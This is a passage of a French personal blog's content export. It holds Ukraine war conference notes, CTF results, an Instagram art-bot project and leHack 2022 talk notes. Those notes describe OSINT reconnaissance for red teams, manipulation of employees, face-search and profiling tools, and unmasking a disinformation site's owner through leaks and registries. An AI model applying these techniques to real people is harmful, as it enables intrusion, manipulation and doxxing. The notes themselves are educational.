territoire.\nL\u0026rsquo;Ukraine, problème géographique et berceau slave # L\u0026rsquo;Ukraine a très peu de frontières naturelles. Elle a aussi un déficit d\u0026rsquo;Histoire, de nation, un désir d\u0026rsquo;Europe depuis quelques années et est un enjeu russe. Ce pays est considéré comme le berceau des pays slaves ; c\u0026rsquo;est La Rus\u0026rsquo; de Kiev. Décrite en son temps comme trop puissante, riche et vaste pour perdurer, c\u0026rsquo;est le premier état slave de l\u0026rsquo;Histoire. Kiev en était la capitale, avec l\u0026rsquo;arrivée des mongols, l\u0026rsquo;empire est détruit et Kiev quasiment rasée. Une partie de la population se replie plus au Nord et fonde Moscou.\nEntourée d\u0026rsquo;états puissants, l\u0026rsquo;Ukraine n\u0026rsquo;avait d\u0026rsquo;autre choix que de se soumettre à l\u0026rsquo;un de ses voisins pour y trouver un protecteur, disait Voltaire en son temps.\nLa Rus' de Kiev en 1054, un état très étendu et entouré de voisins puissants (image tirée de Wikipédia). Un pays chargé d\u0026rsquo;Histoire # Entre 1931 et 1933, Staline organise la mort par la faim du peuple ukrainnien. Il y a entre 3 et 5 millions de morts de cette famine, particulièrement dans l\u0026rsquo;est du pays. Cette même partie qui sera repeuplée ensuite par d\u0026rsquo;autres personnes venues du Nord. Durant la seconde guerre mondiale, les pertes ukrainiennes sont supérieures aux pertes américaines, britanniques et françaises réunies.\nEn 1994 est acté le dénucléarisation de l\u0026rsquo;Ukraine, 1000 têtes nucléaires sont transférées en Russie. En 2014 les \u0026ldquo;néo-nazis\u0026rdquo; russophobes ont fait un coup d\u0026rsquo;état, selon les russes, randant caduc cet accord à leurs yeux.\nEn 2001 le pape de l\u0026rsquo;époque, durant son voyage en Ukraine, rappelle au peuple ukrainien leur désir d\u0026rsquo;indépendance. En 2013 la révolution en Ukraine débute et en 2014 des manifestations russes contre l\u0026rsquo;indépendance de l\u0026rsquo;Ukraine ont également lieux.\nDepuis 2014, il y a une affirmation de la nation ukrainienne ainsi qu\u0026rsquo;une obsession de sécurité. Pour Poutine, ce pays n\u0026rsquo;est pas un état, c\u0026rsquo;est un peuple frère et la guerre se veut comme un \u0026ldquo;rétablissement du cours naturel des choses en Ukraine et au-delà\u0026rdquo;.\nPhoto de la \"Révolution Orange\" en Ukraine en 2004. Les craintes et la vision du voisin russe # A Moscou, on craint la contagion démocratique, comme cela a été le cas en Ukraine. Le pouvoir en place ne veut pas voir les mêmes révoltes qu\u0026rsquo;en Ukraine, en Biélorussie ou au Kazakhstan.\nEn février 2022, la guerre est déclarée, une première en Europe depuis 1945. Pour les russes c\u0026rsquo;est davantage une guerre intra étatique, une guerre civile, qu\u0026rsquo;un conflit entre deux états. La seule paix dans une telle guerre, c\u0026rsquo;est la paix par le cimetière, l\u0026rsquo;extermination, ou l\u0026rsquo;exil. L\u0026rsquo;idée serait de faire peur et de faire fuir les gens, cela peut expliquer pourquoi les russes tirent aux missiles ballistiques directement à l\u0026rsquo;intérieur des villes. Il y a une volonté de faire peur, de faire fuir ceux qui le peuvent et d\u0026rsquo;exterminer les résistants.\nLes limites du modèle russe # Plusieurs facteurs peuvent expliquer les difficultés que rencontrent les russes sur le terrain :\nune vision stratégique et politique érronée un adversaire sous estimé une usure anormalement rapide de l\u0026rsquo;armée russe difficulté de communication entre les troupes Aujourd\u0026rsquo;hui, le constat est que l\u0026rsquo;outil militaire russe est à la limite de la dislocation selon le conférencier. La planification est hasardeuse et elle peine à se rétablir sur les lignes. Les pertes sont également considérables, tant humaines que matérielles ; c\u0026rsquo;est une succession de fautes stratégiques et tactiques.\nEn Russie, l\u0026rsquo;armée ne possède pas de sous-officier. Cela implique que le soldat dépend directement de l\u0026rsquo;officier, qui ne connaît pas forcément bien le terrain. Les raisons de ce manque peuvent être expliquées par une peur de la révolte de ces gradés qui pourrait ammener à un coup d\u0026rsquo;état.\nOn peut également citer une certaine précipitation du pouvoir russe. Le retrait en Afghanistan a été un aveux de faiblesse de la part des occidentaux, la Russie en a profité. Il est probable que Poutine n\u0026rsquo;ait pas anticipé les actions des Occidentaux.\nBilan (fin septembre 2022) : 50k soldats tués, 80k hors de combat, 2200 chars de combats\u0026hellip;\nLe monde vu du Kremelin # C\u0026rsquo;est la vision des tsars, on regrette l\u0026rsquo;effondrement soviétique. L\u0026rsquo;impératif Russe est de protéger Moscou qui est envahie et pillée une fois par siècle. Il y a une attirance et une répulsion vis-à-vis de l\u0026rsquo;Ouest.\nAu cours therme il faut regagner de la profondeur stratégique et exploiter les faiblesses des occidentaux. En 1945, il y a eu un premier élargissement vers l\u0026rsquo;ouest (états baltes). Au milieux des années 1990 c\u0026rsquo;est l\u0026rsquo;élargissement de l\u0026rsquo;alliance atlantique vers l\u0026rsquo;est suivie de l\u0026rsquo;élargissement de l\u0026rsquo;Union Européenne qui domine.\nAujourd\u0026rsquo;hui, le virus démocratique atteint les anciens pays soviétiques (Biélorussie, Géorgie, Ukraine, Kirghiztan\u0026hellip;). Ces états, dirigés essentiellement par un pouvoir autoritaire, font régulièrement appel aux russes pour maintenir le pouvoir en place.\nLes russes ont développé le concept de \u0026ldquo;l\u0026rsquo;étranger proche\u0026rdquo; ; si l\u0026rsquo;on parle russe, que l\u0026rsquo;on a la culture russe, on est russe et on bénéficie de l\u0026rsquo;aide russe. Ils ont également développé le concept de guerre non-linéaire, qui est caractérisé par un emploi des forces armées conventionnelles, même pour une grande puissance nucléaire.\nLa fin du lien transatlantique # Les relations se sont tendues entre les USA et l\u0026rsquo;Europe, en particulier lors du mandat de Trump. Biden pourrait être un \u0026ldquo;retour de l\u0026rsquo;amérique\u0026rdquo;. Cependant, rien ne garantit que la vision de l\u0026rsquo;administration Biden ne perdure au delà de son mandat. L\u0026rsquo;avenir de l\u0026rsquo;UE et de l\u0026rsquo;OTAN se joue aujourd\u0026rsquo;hui aux frontières de l\u0026rsquo;Europe. Nos institutions sont-elles suffisemment fortes pour riposter ? Non selon le conférencier.\nLe voisin chinois et la communauté internationale # Le rapport de force est bien différent avec la Chine. La Sibérie est bien vide devant l\u0026rsquo;appétit chinois. Le soutiens chinois à la Russie est critiqué au sein du parti unique chinois et les critiques de cette \u0026ldquo;amitié\u0026rdquo; sont de plus en plus visibles. Le rapport démographique est également largement en faveur de la Chine, de même que pour la puissance militaire et économique.\nA noter que la Chine s\u0026rsquo;est abstenue lors du vote à l\u0026rsquo;ONU pour la condamnation de l\u0026rsquo;action russe (141 pour, 5 contre, 35 abstentions), tout comme l\u0026rsquo;Iran et l\u0026rsquo;Inde. Selon le conférencier, le vote d\u0026rsquo;abstention est aussi un vote chinois. Toute l\u0026rsquo;Asie centrale a suivi ce vote non-aligné. Les pays de l\u0026rsquo;OTSC (mini OTAN russe), n\u0026rsquo;ont en majorité pas voté contre la condamnation de l\u0026rsquo;action de Poutine. Pire que cela, cette opération pourrait avoir entachée les relations entre ces pays. Lors de sommets qui ont eu lieux dans la région, on a pu voir le président de l\u0026rsquo;Ouzbékistan faire attendre Poutine.\nSalon le conférencier, cet affrontement ne pourra pas se terminer autrement que par l\u0026rsquo;effondrement de l\u0026rsquo;une ou l\u0026rsquo;autre des parties. Selon lui, le régime de Poutine est le plus prompt à s\u0026rsquo;écrouler.\nRésultat du vote de la résolution de l’Assemblée générale des Nations unies condamnant la guerre en Ukraine et demandant le retrait immédiat des forces russes, le 2 mars 2022 (Journal Le Monde). En vert : pour (141), en jaune : abstention (35), en rouge : contre (5). ","date":"2 octobre 2022","permalink":"/posts/a-propos-de-la-guerre-en-ukraine-geographie-et-histoire/","section":"Mes articles","summary":"Café stratégique du 27 septembre 2022\nConférencier : Roger DUBURG, Ancien directeur adjoint de la Délégation aux Affaires Stratégiques du ministère de la défense.","title":"A Propos De La Guerre en Ukraine : Geographie Et Histoire"},{"content":"Le 404CTF est une compétition organisé par Télécom Sud-Paris en partenariat avec la DGSE. Cette année (2022) ce CTF était marqué par le double anniversaire ; les 80 ans du BCRA (service secret de la France Libre) et les 40 ans de la DGSE.\nPlus d\u0026rsquo;informations ici\nC\u0026rsquo;était mon second CTF et je suis globalement satisfait de mes résultats. J\u0026rsquo;ai malheureusement perdu le détail de mon score mais le mail récapitulatif est là pour me rappeler mon placement :\nBravo nathan.out ! Vous êtes arrivé parmi les 1000 premiers du challenge. [...] Les épreuves ont été conçues par le club HackademINT et hébergées par OVHcloud. Voici votre classement : 189/2460 avec 13293 pts N\u0026#39;hésitez pas à nous faire des retours sur le 404 CTF à l\u0026#39;adresse suivante : \u0026lt;\u0026gt; A bientôt pour d\u0026#39;autres challenges ! L’équipe du 404 CTF L\u0026rsquo;objectif était d\u0026rsquo;atteindre le top 100 pour obtenir l\u0026rsquo;invitation à un salon de cybersécurité mais je ne suis malheureusement pas parvenu à ce résultat. La compétition était rude mais c\u0026rsquo;était une superbe expérience, j\u0026rsquo;ai beaucoup aimé le format sur 1 mois. En espérant qu\u0026rsquo;ils soit de nouveau organisé l\u0026rsquo;année prochaine\u0026hellip;\n","date":"6 août 2022","permalink":"/a-propos/resultats-ctf/4042022/","section":"A Propos","summary":"Le 404CTF est une compétition organisé par Télécom Sud-Paris en partenariat avec la DGSE.","title":"404 CTF 2022"},{"content":"Pour mon tout premier CTF, je n\u0026rsquo;ai pas commencé par le plus simple\u0026hellip;\nLe France CyberSecurity Challenge est une compétition de cybersécurité dont les challenges sont créés par les agents de l\u0026rsquo;ANSSI. Elle vise à recruter les meilleurs talents français pour l\u0026rsquo;ECSC (European Cybersecurity Challenge).\nPlus d\u0026rsquo;information ici\nRésumé du CTF : à peine réussi les challenges d\u0026rsquo;intro mais avec une réussite dans un challenge de cryptographie. Les challenges étaient très plaisants à faire tout de même, j\u0026rsquo;ai énormément appris durant ces quelques semaines de compétition, à refaire en 2023, donc !\nLa capture est un peu petite :\n8 challenges d\u0026rsquo;introduction 4 challenges \u0026ldquo;welcome\u0026rdquo; 1 challenge de cryptographie (pour le coup très simple en comparaison des autres) ","date":"6 août 2022","permalink":"/a-propos/resultats-ctf/fcsc2022/","section":"A Propos","summary":"Pour mon tout premier CTF, je n\u0026rsquo;ai pas commencé par le plus simple\u0026hellip;","title":"FCSC 2022"},{"content":"Un vue succincte de mes résultats en CTF.\n","date":"5 août 2022","permalink":"/a-propos/resultats-ctf/","section":"A Propos","summary":"Un vue succincte de mes résultats en CTF.","title":"Resultats CTF"},{"content":"Etudiant en cyberdéfense, développeur, amateur de CTF et éternel curieux. Tombe régulièrement dans des rabbit holes.\nSite Description GitHub Mon Github Cyberdefenders Cyberdefenders ","date":"5 août 2022","permalink":"/a-propos/","section":"A Propos","summary":"Etudiant en cyberdéfense, développeur, amateur de CTF et éternel curieux. Tombe régulièrement dans des rabbit holes.","title":"A Propos"},{"content":" ","date":"5 août 2022","permalink":"/","section":"Blog","summary":" ","title":"Blog"},{"content":"Tous mes articles, plus ou moins bien rangés.\n","date":"5 août 2022","permalink":"/posts/","section":"Mes articles","summary":"Tous mes articles, plus ou moins bien rangés.","title":"Mes articles"},{"content":"Des démonstrations de certains de mes projets.\n","date":"5 août 2022","permalink":"/projets/","section":"Projets","summary":"Des démonstrations de certains de mes projets.","title":"Projets"},{"content":"Instagram regorge de bots (ou robots), la plateforme leur mène une guerre totale avec des moyens colossaux et des technologies d\u0026rsquo;analyse du comportement poussées pour déterminer si un compte est managé par un robot ou non. Pourquoi ? Ces robots sont parfois mal intentionnés : arnaque, harcèlement, désinformation ou tout simplement spam. C\u0026rsquo;est pourquoi si un robot se fait détecter, il est automatiquement supprimé de la plateforme, maintenir un réseau de bot est donc compliqué et risqué, on peut tout perdre très rapidement. De l\u0026rsquo;autre côté, les créateurs de bots rivalisent d\u0026rsquo;ingéniosité afin de rester invisible, c\u0026rsquo;est un sujet passionnant, une vraie guerre invisible, mais ça n\u0026rsquo;est pas le sujet d\u0026rsquo;aujourd\u0026rsquo;hui.\nIl est existe pourtant une technique afin de créer un bot légitime aux yeux d\u0026rsquo;Instagram : utiliser l\u0026rsquo;API de Meta (ex Facebook). Ce bot est donc connu de la plateforme, il possède quelques limitations mais fera parfaitement l\u0026rsquo;affaire pour ce que souhaite en faire.\nUn bot, mais pour quoi faire ? # Il y a quelques temps, je suis tombé sur cet article au titre plutôt sexy : How I Eat For Free in NYC Using Python, Automation, Artificial Intelligence, and Instagram. API, Intelligence Artificielle, Python, automatisation et analyse de données : ça vend du rêve ! Pour résumer l\u0026rsquo;article, un ingénieur, avec beaucoup trop de temps à perdre visiblement, s\u0026rsquo;est réveillé un matin avec une envie : manger gratuitement dans les restaurants de New-York. Puisqu\u0026rsquo;il a des compétences en informatique, il décide de créer un bot Instagram qui va analyser les publications culinaires qui fonctionnent le mieux à New-York, de les re-poster sur son compte, d\u0026rsquo;observer ce qu\u0026rsquo;il se passe et, bien sûr, de monétiser sa visibilité. Tout cela, boosté avec de l\u0026rsquo;intelligence artificielle et des techniques de big data pour être le plus efficace possible. L\u0026rsquo;objectif final est d\u0026rsquo;échanger la visibilité de son compte contre des repas gratuits dans les meilleurs restaurant de la ville, du génie ! Benjamin Code en a fait une vidéo qui récapitule le projet, je vous invite aussi à lire l\u0026rsquo;article, c\u0026rsquo;est passionnant.\nJe me suis dis que je pouvais moi aussi tenter l\u0026rsquo;expérience, à plus petite échelle et avec moins de connaissances que lui. L\u0026rsquo;objectif est de créer un compte qui pourrait publier du contenu automatiquement, sans analyse de donnée (type big data) et sans IA, dans un premier temps.\nA la recherche de contenu # Publier du contenu c\u0026rsquo;est bien, mais encore faut-il en avoir. Ca tombe bien puisque quelques jours auparavant, un ami m\u0026rsquo;a transmis ce repo Github qui regroupe des API publiques. C\u0026rsquo;est une vraie mine d\u0026rsquo;or et l\u0026rsquo;une de ces API m\u0026rsquo;a fait de l\u0026rsquo;oeil : Metropolitan Museum of Art. Elle regroupe une quantité colossale d\u0026rsquo;oeuvres d\u0026rsquo;art (avec des photos !). Le principe est simple : j\u0026rsquo;envoie une requête à l\u0026rsquo;API, elle me répond avec une oeuvre d\u0026rsquo;art et des informations en plus, voilà pour le contenu.\nL\u0026rsquo;API d\u0026rsquo;Instagram : voyage en terre inconnue # Comme expliqué plus haut, pour avoir un bot \u0026ldquo;legit\u0026rdquo; je dois passer par l\u0026rsquo;API d\u0026rsquo;Instagram. Le truc qui m\u0026rsquo;a fait perdre beaucoup, beaucoup, de temps a été de comprendre comment avoir un accès. En effet, cette API nécessite une configuration particulière assez pénible et laborieuse à mettre en place :\nun compte Facebook Developer (un numéro de téléphone valide vous sera demandé) une page Facebook liée à ce compte developer un compte Instagram professionnel (impossible de le lier à l\u0026rsquo;API sinon) une tripotée de configuration, d\u0026rsquo;identifiants et de secrets à avoir remuez le tout, avec quelques tutos en ligne et un peu de temps, vous devriez arriver à faire votre première requête A noter quand même qu\u0026rsquo;Instagram ou Facebook ne vous laissera pas tranquille. En effet, il m\u0026rsquo;est arrivé de jongler entre mes comptes persos et ceux pour mon bot\u0026hellip; ce qui a eu pour effet de bloquer mon compte bot ! Tout ça parce que j\u0026rsquo;avais une activité \u0026ldquo;suspecte\u0026rdquo; avec un compte nouvellement créé, quand je vous disais que ces grandes plateformes faisaient la guerre aux bots\u0026hellip; Il faut parfois attendre un peu, parfois valider son mail, bref c\u0026rsquo;est pas super pratique.\nUne fois cela fait, il \u0026ldquo;suffit\u0026rdquo; de comprendre l\u0026rsquo;ordre des requêtes pour arriver à poster une image sur Instagram. Là encore ça n\u0026rsquo;est pas si simple mais une fois qu\u0026rsquo;on a compris l\u0026rsquo;ordre et ce que nous retourne chaque requête, le script est plutôt facile à coder. Nous voilà donc avec un accès et un compté légitime et des données en pagaille. Ne reste plus qu\u0026rsquo;à coder le robot pour qu\u0026rsquo;il aille de lui-même chercher les images dont il a besoin et les publier.\nHe\u0026rsquo;s alive ! # Cette partie a été la plus longue, de loin. J\u0026rsquo;ai passé quelques soirées et raccourci des nuits mais c\u0026rsquo;était la partie la plus fun, bien plus que d\u0026rsquo;obtenir des accès à l\u0026rsquo;API. Il ne reste qu\u0026rsquo;à traiter les données pour les publier.\nDu tris # Le premier problème est que tous les éléments de l\u0026rsquo;API ne contiennent pas d\u0026rsquo;image. Par exemple lorsqu\u0026rsquo;on requête l\u0026rsquo;API pour obtenir un élément de sa collection, il arrive qu\u0026rsquo;il n\u0026rsquo;y ait pas d\u0026rsquo;images : on a un titre un auteur et tout un tas d\u0026rsquo;autres données\u0026hellip; mais pas d\u0026rsquo;images. Premier filtre sur les éléments qui ont une image.\nEnsuite, certains des éléments de l\u0026rsquo;API ont plusieurs images, une image \u0026ldquo;primaire\u0026rdquo; et des images \u0026ldquo;secondaires\u0026rdquo;, qui sont des photos de l\u0026rsquo;oeuvre prises sous différents angles. Second filtre pour avoir des éléments avec plusieurs images.\nInstagram n\u0026rsquo;accepte pas tous les ratios d\u0026rsquo;images ; une image trop étirée verticalement ou horizontalement ne sera pas acceptée pour être publiée. Troisième filtre.\nEnfin, en faisant mes tests j\u0026rsquo;ai remarqué que certaines catégories d\u0026rsquo;oeuvres retournaient des images vraiment très peu intéressantes : des fragments de poterie, par exemple. Quatrième filtre.\nUne fois qu\u0026rsquo;on a des images à peu près jolies et publiables sur Insta, on peut continuer à perfectionner notre publication. J\u0026rsquo;aime bien rendre à César ce qui est à César ; c\u0026rsquo;est pourquoi j\u0026rsquo;ai eu à coeur de mettre toutes les infos en ma possession (quand j\u0026rsquo;en avais) pour chaque oeuvre publiée :\ntitre auteur (+ dates de naissance et de mort) type d\u0026rsquo;oeuvre collection crédits et d\u0026rsquo;autres\u0026hellip; Reste une chose primordiale, les HASHTAGS.\nUn peu d\u0026rsquo;intelligence\u0026hellip; # Ces foutus hashtags m\u0026rsquo;en auront fait voir de toutes les couleurs ! Pour le faire courte, c\u0026rsquo;est ce qui va permettre de référencer ma publication, il faut donc qu\u0026rsquo;ils soient :\nprécis relativement nombreux (mais pas trop non plus) cohérents avec la publication Pour cela j\u0026rsquo;ai découpé mes hashtags en 3 catégories :\nles hashtags statiques, c\u0026rsquo;est-à-dire ceux qui seront toujours là, par exemple \u0026ldquo;#art\u0026rdquo;, \u0026ldquo;#masterpiece\u0026rdquo;, \u0026ldquo;#picture\u0026rdquo;, \u0026ldquo;#museum\u0026rdquo;, \u0026ldquo;#exposition\u0026rdquo;. les hashtags dynamiques, ceux directement issus des données de l\u0026rsquo;oeuvre sur la publication : nom de l\u0026rsquo;oeuvre, de l\u0026rsquo;artiste, type, date, culture\u0026hellip; les hastags intelligents, qui ne sont ni issus des données de l\u0026rsquo;image, ni de ma main. Ils doivent être tirés de l\u0026rsquo;image. J\u0026rsquo;avais dans l\u0026rsquo;idée d\u0026rsquo;extraire des mots-clefs de l\u0026rsquo;oeuvre, par exemple pour l\u0026rsquo;image ci-dessous on aurait pu avoir : bridge, phone, sunset, hand, road, sky\u0026hellip;\n\u0026ldquo;Quoi de mieux que l\u0026rsquo;intelligence artificielle pour faire ça ?\u0026rdquo; - me demandais-je naïvement.\nEffectivement il existe des modèles d\u0026rsquo;IA pour effectuer ce travail, je l\u0026rsquo;ai ajouté à mon projet, j\u0026rsquo;ai trouvé un peu de code sur internet pour le faire en python (le langage que j\u0026rsquo;utilise), et ça fonctionne ! Par contre les résultats sont très, très mitigés. Par exemple, pour l\u0026rsquo;image du dessus, le modèle trouvait un \u0026ldquo;ours polaire\u0026rdquo;, une \u0026ldquo;montgolfière\u0026rdquo; et autres bizareries\u0026hellip;\n\u0026hellip;ou pas ! # Alors j\u0026rsquo;ai fais des hypothèses, j\u0026rsquo;ai cherché, j\u0026rsquo;ai galéré, j\u0026rsquo;ai même pensé que je faisais \u0026ldquo;rentrer\u0026rdquo; mon image dans le mauvais sens dans mon IA\u0026hellip; mais non ! Le modèle est juste mauvais. Pour comprendre il faut que j\u0026rsquo;explique l\u0026rsquo;apprentissage supervisé en deux mots.\nOn donne une immeeeeennnnse quantité d\u0026rsquo;images au modèle qu\u0026rsquo;on souhaite entraîner avec à chaque fois des mots-clefs associés à chaque image (par exemple une image de canard avec comme mot-clef \u0026ldquo;canard\u0026rdquo;, \u0026ldquo;oiseau\u0026rdquo;, etc\u0026hellip;). Pour chaque image l\u0026rsquo;IA va tenter d\u0026rsquo;elle-même de trouver des mots-clefs et une fois ses résultats donnés, elle les compare avec ce qu\u0026rsquo;elle aurait dû trouver (\u0026ldquo;canard\u0026rdquo;, \u0026ldquo;oiseau\u0026rdquo;, etc\u0026hellip;), et elle \u0026ldquo;s\u0026rsquo;améliore\u0026rdquo; en fonction de l\u0026rsquo;écart entre ce qu\u0026rsquo;elle a prédit et ce qu\u0026rsquo;elle aurait dû trouver.\nLe soucis de cette méthode c\u0026rsquo;est que l\u0026rsquo;IA ne va reconnaître que ce sur quoi elle s\u0026rsquo;est entraînée. Plus on souhaite une IA performante sur une large gamme d\u0026rsquo;image, plus on doit lui donner une quantité de donnée, un dataset, grand et bien construit. Si notre IA doit seulement différencier un panneau stop d\u0026rsquo;un passage piéton, c\u0026rsquo;est \u0026ldquo;facile\u0026rdquo;. Si, en revanche, elle doit pouvoir détecter n\u0026rsquo;importe quoi sur n\u0026rsquo;importe quelle image, c\u0026rsquo;est une autre paire de manches.\nLe soucis c\u0026rsquo;est que le modèle pré-entraîné que j\u0026rsquo;ai voulu utilisé était trop généraliste, il pouvait tout reconnaître mais faisait beaucoup trop d\u0026rsquo;erreurs (je n\u0026rsquo;avais parfois aucun mot en rapport, même de loin, avec mon image !). Tout ça pour dire qu\u0026rsquo;à moins d\u0026rsquo;entraîner moi-même l\u0026rsquo;IA sur un dataset d\u0026rsquo;oeuvre d\u0026rsquo;art proches de celles sur lesquelles je souhaitais extraire les mots-clefs, je ne pourrais rien en tirer. Je ne dispose ni du temps, ni de la puissance de calcul, ni de l\u0026rsquo;espace de stockage, ni des compétences, ni du dataset pour le faire. Une prochaine fois peut-être ?\nEn vérité ce sujet mériterait un article à part entière tellement c\u0026rsquo;est bien plus compliqué et passionnant que ça.\nEncore un petit effort # Après ce détour dans les méandres de l\u0026rsquo;IA, me voilà de retour sur mon bot, sans mes mots-clef \u0026ldquo;intelligents\u0026rdquo;, tant pis ! Après quelques tests, quelques sesssions de \u0026ldquo;debug\u0026rdquo;, j\u0026rsquo;ai un programme fonctionnel ! Il est capable de rechercher, traiter et poster une publication Instagram ! Ne reste qu\u0026rsquo;à le mettre sur un serveur, programmer ses horaires de diffusion et surveiller que tout se passe bien dans un premier temps, avant de le laisser vivre sa vie de bot Instagram. Il publie tous les jours à 10h et 20h.\nSans plus attendre, voilà Archie, le robot ! Je vous invite à aller voir son compte @archie_the_aesthete pour ne rater aucune publi, pensez à vous abonner et à lâcher un like, ça lui fera plaisir ! :).\nBon, pour le moment le succès n\u0026rsquo;est pas au rendez-vous, mais ça viendra\u0026hellip;\nQuelques-unes de ses publications :\nLa suite ? # Il y aurait encore des tas et des tas d\u0026rsquo;améliorations à apporter. On est encore loin de l\u0026rsquo;article qui m\u0026rsquo;a inspiré ce projet, il manque l\u0026rsquo;IA bien sûr et le côté analyse de données. Cela fait 3 semaines maintenant qu\u0026rsquo;Archie tourne et je ne vois pas vraiment d\u0026rsquo;évolution du compte, il n\u0026rsquo;y a pas d\u0026rsquo;abonnés ni de tendance à la hausse. Pour monayer ce compte, on repassera mais le projet était vraiment cool j\u0026rsquo;ai appris énormément de choses ! Peut-être que je rendrai le code libre, pensez à checker mon github.\nJe pense à une V2 avec plein de nouvelles fonctionnalités qui permettraient d\u0026rsquo;améliorer la visibilité du robot :\ncréation d\u0026rsquo;une story à chaque nouvelle publication des oeuvres plus alléchantes (certaines ne sont pas du tout \u0026ldquo;instagrammables\u0026rdquo;, faut être honnête) garder un feed cohérent (des couleurs proches les unes des autres entre les publications), c\u0026rsquo;est ce qui fait \u0026ldquo;pro\u0026rdquo;, il parait de l\u0026rsquo;analyse de données pour savoir ce qui fonctionne, à quels horaires publier, etc\u0026hellip; Bref il reste encore du boulot et des tas de trucs intéressants à explorer ! Sur ce, bon vent, Archie !\n","date":"5 août 2022","permalink":"/posts/jai-cree-un-bot-instagram-100-pourcent-legal-et-totalement-automatise/","section":"Mes articles","summary":"Instagram regorge de bots (ou robots), la plateforme leur mène une guerre totale avec des moyens colossaux et des technologies d\u0026rsquo;analyse du comportement poussées pour déterminer si un compte est managé par un robot ou non.","title":"J'ai créé un bot Instagram 100% légal et totalement automatisé"},{"content":"Epios\nObjectif : : compromettre une organisation. On utilisera par exemple du crochetage, de l\u0026rsquo;USB dropping\u0026hellip; La cyber kill chain est la suite d\u0026rsquo;étape permettant de compromettre une organisation.\nReconnaissance via l\u0026rsquo;OSINT # On différencie bien l\u0026rsquo;OSINT de l\u0026rsquo;ingénierie sociale. L\u0026rsquo;objectif est de passer innaperçu. Pour cela, l\u0026rsquo;OSINT peut nous aider à connaître le vocabulaire propre à l\u0026rsquo;entreprise, les employés immportants/intéressants, la connaissance de prestataires de l\u0026rsquo;entreprise mais aussi les lieux stratégiques. Le présentateur montre deux exemples :\ndorks pour connaître certains prestataires de la CIA. geoint pour deviner l\u0026rsquo;emplacement de datacenter interne à l\u0026rsquo;entreprise (via la climatisation notamment) et les points de livraisons, souvent laissés ouverts et sans surveillance particulière. Les réseaux sociaux ont une importance, on a tendance à les sous-estimer et à ne pas tous les regarder. En effet, les stagiaires et/ou jeunes employés sont sur Snapchat, Tiktok ou Instagram, ils peuvent par exemple filmer une partie de leur quotidien dans l\u0026rsquo;entreprise et nous informer sur la structure des locaux, le matériel utilisé, la présence ou non de badgeuse\u0026hellip; De la même manière, il faut faire attention aux employés ainsi qu\u0026rsquo;aux visiteurs.\nLe présentateur illustre ses propos par l\u0026rsquo;affaire Strava (Jean-Marc Manach, journaliste chez Next INpact) : des militaires/espions qui utilisaient cette application de running et qui permettait de découvrir des bases militaires secrètes. Strava est un petit réseau social, on peut par exemple y faire des groupes de coureur. Cela peut être très utile pour trouver des noms d\u0026rsquo;employés et voir leurs habitudes de courses (à priori cette fonctionnalité est en train d\u0026rsquo;être patchée).\nA partir de toutes ces informations, il est possible d\u0026rsquo;approcher des personnes de l\u0026rsquo;entreprise et de gagner leur confiance. Il est alors possible de les manipuler, on connaît leurs passions, son niveau d\u0026rsquo;accès dans l\u0026rsquo;entreprise voire même son tempérament.\nQuelques outils et références :\nThe Stuxnet Story -\u0026gt; de l\u0026rsquo;OSINT a été utilisé à partir d\u0026rsquo;images de propagande du régime iranien pour connaître le type d\u0026rsquo;équipement, les versions des logiciels\u0026hellip; Crystalknows -\u0026gt; IA qui, à partir d\u0026rsquo;un compte LinkedIn, permet de dresser un profil psychologique d\u0026rsquo;une personne. Hunter.io -\u0026gt; trouver des adresses email professionnelles. Pimeyes -\u0026gt; (payant) reconnaissance de personnes à partir d\u0026rsquo;une photo de leur visage. L\u0026rsquo;étape suivante consiste à passer à l\u0026rsquo;attaque.\n","date":"30 juin 2022","permalink":"/posts/lehack2022/osint/osint-red-team/","section":"Mes articles","summary":"Epios\nObjectif : : compromettre une organisation. On utilisera par exemple du crochetage, de l\u0026rsquo;USB dropping\u0026hellip; La cyber kill chain est la suite d\u0026rsquo;étape permettant de compromettre une organisation.","title":"L'OSINT dans la Red Team"},{"content":"Open Facto fédérer l\u0026rsquo;OSINT français\nQactus : site de désinformation français proche de la mouvance Qanon (USA), les thématiques abordées sont les complots en tout genre, l\u0026rsquo;antivaccination, l\u0026rsquo;antisémitisme\u0026hellip; Il s\u0026rsquo;est fait connaître durant la crise du COVID. Le compte Twitter du site a été banni mais ce réseau social reste un lieux privilégié pour la diffusion des articles.\nTechnologiquement, c\u0026rsquo;est un blog WordPress créé le 6 mai 2020 et qui comporte un traqueur publicitaire (détail important pour la fin). Le but de la conférence est de comprendre l\u0026rsquo;environnement de ce genre de site, son fonctionnement ainsi que d\u0026rsquo;essayer de retrouver son/ses créateur(s)/administrateur(s).\nLes pivots utilisés lors de l\u0026rsquo;enquête :\niqwhois archive.org publicwww (moteur de recherche pour du code source de site) Comprendre l\u0026rsquo;écosystème # Les outils utilisés sont :\nHyphe : collecte et cartographie de l\u0026rsquo;information. Une fonctionnalité intéressante est de pouvoir calculer la densité d\u0026rsquo;un graphe ; permet de savoir quel site cite t Gephi : analyse et cartographie de l\u0026rsquo;information (très complémentaire avec Hyphe) Retina (lien de l\u0026rsquo;outil ?) : visualisation de la donnée Smat.app : visualisation dans le temps selon des critères, par exemple on peut voir l\u0026rsquo;impact de la désinformation par Qactus pendant et après le covid. Snscrape : récupération de contenus des réseaux sociaux (ici Twitter) Open Refine : nettoyage et mise en forme des données. L\u0026rsquo;analyse du corpus de donnée a été faite avec python ou le langage R. Une fois la donnée collectée et raffinée, on observe ceci :\n120k tweets comportant un lien vers qactus ont été publiés depuis le 26 juin 2020. 9k comptes différents ont intéragis avec au moins un post certains utilisateurs sont très actifs (ex : 3.9k tweets pour le plus actuf) certains utilisateurs sont influents (ex : Christine Kelly \u0026amp; Di Borgo) la communauté est relativement petite mais très active Après analyse des liens du site, on observe bien que Qactus est proche de la mouvance Qanon ; beaucoup de liens renvoient vers ce site ou d\u0026rsquo;autres du même genre. On observe une bulle de filtre.\nOn peut également dresser le palmarès des plus gros posteurs, retweeters, likers\u0026hellip;\nQui est derrière le site ? # Un site sous WordPress permet de récupérer la liste des auteurs et d\u0026rsquo;autres informations utiles. On récupère un pseudo qui nous ammène vers un compte Google et une chaîne Youtube. Cela semble être la chaîne officielle de Qactus. Si on recherche dans les leaks, les pages jaunes ou copain d\u0026rsquo;avant on trouve quelques informations en plus et des noms qui pourraient être la véritable identité de créateur du site. Grâce à pappers.fr on peut retrouver la SARL d\u0026rsquo;un candidat, sa date de naissance, sa signature\u0026hellip; Wayback machine nous permet de retrouver un vieux site de 2004, ce qui semble indiquer que la personne possède des compétences en informatique malgré le fait 